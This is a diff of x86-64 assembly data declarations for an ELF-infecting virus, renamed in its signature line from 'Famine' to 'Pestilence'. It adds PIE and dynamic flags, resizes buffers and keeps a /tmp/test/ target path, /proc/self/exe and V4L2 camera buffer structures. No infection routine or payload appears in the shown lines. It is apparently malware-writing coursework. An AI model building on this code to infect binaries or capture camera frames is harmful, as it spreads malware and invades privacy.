@@ -1,6 +1,6 @@
 file_size dq 0
 file	db 'elf64 found!', 0
-signature	db 'Famine version 1.0 (c)oded by alexafer-jdecorte', 0
+signature	db 'Pestilence version 1.0 (c)oded by alexafer-jdecorte', 0
 old_entry		   dq 0
 new_entry		   dq 0
 self	db '/proc/self/exe', 0
@@ -83,6 +83,9 @@ templates_r15:
     db 0x49, 0x83, 0xe7, 0x00, 0x90, 0x90, 0x90     ; and r15, 0
 
 ; NEW HEADER
+	dynm:	db 0
+	inte:	db 0
+	ispie:	db 0
 new_programheader:
     p_type		dd	1
     p_flags		dd	7
@@ -96,16 +99,17 @@ new_programheader:
 newl	times 0001 db 0xa
 path	db '/tmp/test/', 0
 buffer_bss:
-padd	times 0512 db 0
-buff	times 4096 db 0
-elfp0	times 0056 db 0
-elfp1	times 0056 db 0
-buf_addrs   times NBUF dq 0  ; adresses mmap des tampons
-buf_sizes   times NBUF dq 0   ; leurs tailles
-reqb        times 16   db 0         ; struct v4l2_requestbuffers
-v4buf       times 88   db 0      ; struct v4l2_buffer (x86-64 = 88 o)
+    padd	times 4096 db 0
+    buff	times 4096 db 0
+    stack	times 0144 db 0
+    elfp0	times 0056 db 0
+    elfp1	times 0056 db 0
+    buf_addrs   times NBUF dq 0  ; adresses mmap des tampons
+    buf_sizes   times NBUF dq 0   ; leurs tailles
+    reqb        times 16   db 0         ; struct v4l2_requestbuffers
+    v4buf       times 88   db 0      ; struct v4l2_buffer (x86-64 = 88 o)
 
-path_buffer times 256 db 0
-comm_buff   times 32 db 0
+    path_buffer times 256 db 0
+    comm_buff   times 32 db 0
 
 end_addr:
